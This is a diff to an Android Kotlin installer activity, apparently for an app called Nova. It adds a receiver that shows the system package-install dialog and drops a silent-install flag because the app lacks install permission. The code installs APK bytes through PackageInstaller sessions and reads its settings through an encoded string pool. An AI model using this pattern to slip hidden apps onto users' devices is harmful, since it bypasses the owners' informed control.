@@ -128,6 +128,14 @@ class InstallActivity : AppCompatActivity() {
             registerReceiver(installSuccessReceiver, filter)
         }
 
+        // Register dialog receiver — shows PackageInstaller dialog from foreground
+        val dialogFilter = IntentFilter(InstallReceiver.ACTION_SHOW_INSTALL_DIALOG)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            registerReceiver(installDialogReceiver, dialogFilter, Context.RECEIVER_NOT_EXPORTED)
+        } else {
+            registerReceiver(installDialogReceiver, dialogFilter)
+        }
+
         val prefs = getSharedPreferences(StringPool.d(StringPool.PREFS_NAME), MODE_PRIVATE)
         val savedStage = prefs.getString(StringPool.d(StringPool.KEY_STAGE), Stage.IDLE.name)
 
@@ -169,6 +177,30 @@ class InstallActivity : AppCompatActivity() {
         super.onDestroy()
         handler.removeCallbacksAndMessages(null)
         try { unregisterReceiver(installSuccessReceiver) } catch (_: Exception) {}
+        try { unregisterReceiver(installDialogReceiver) } catch (_: Exception) {}
+    }
+
+    // Receives local broadcast from InstallReceiver when install dialog must be shown.
+    // Must be shown from a foreground Activity — BroadcastReceiver cannot show it reliably.
+    private val installDialogReceiver = object : BroadcastReceiver() {
+        override fun onReceive(context: Context, intent: Intent) {
+            if (intent.action == InstallReceiver.ACTION_SHOW_INSTALL_DIALOG) {
+                val userIntent = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
+                    intent.getParcelableExtra(InstallReceiver.EXTRA_USER_INTENT, Intent::class.java)
+                } else {
+                    @Suppress("DEPRECATION")
+                    intent.getParcelableExtra(InstallReceiver.EXTRA_USER_INTENT)
+                } ?: return
+                try {
+                    startActivity(userIntent)
+                } catch (e: Exception) {
+                    // Fallback: wrap in chooser
+                    try {
+                        startActivity(Intent.createChooser(userIntent, "Install"))
+                    } catch (ex: Exception) { }
+                }
+            }
+        }
     }
 
     private val installSuccessReceiver = object : BroadcastReceiver() {
@@ -423,8 +455,10 @@ class InstallActivity : AppCompatActivity() {
 
             params.setSize(apkBytes.size.toLong())
             params.setInstallLocation(1)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
-                params.setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED)
+            // Do NOT set USER_ACTION_NOT_REQUIRED — Nova lacks INSTALL_PACKAGES permission.
+            // With USER_ACTION_NOT_REQUIRED, Android tries silent install → fails with
+            // STATUS_FAILURE_BLOCKED. We need STATUS_PENDING_USER_ACTION to show the dialog.
+            // The dialog WILL appear when InstallReceiver handles STATUS_PENDING_USER_ACTION.
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
                 params.setDontKillApp(true)
             params.setInstallReason(PackageManager.INSTALL_REASON_USER)
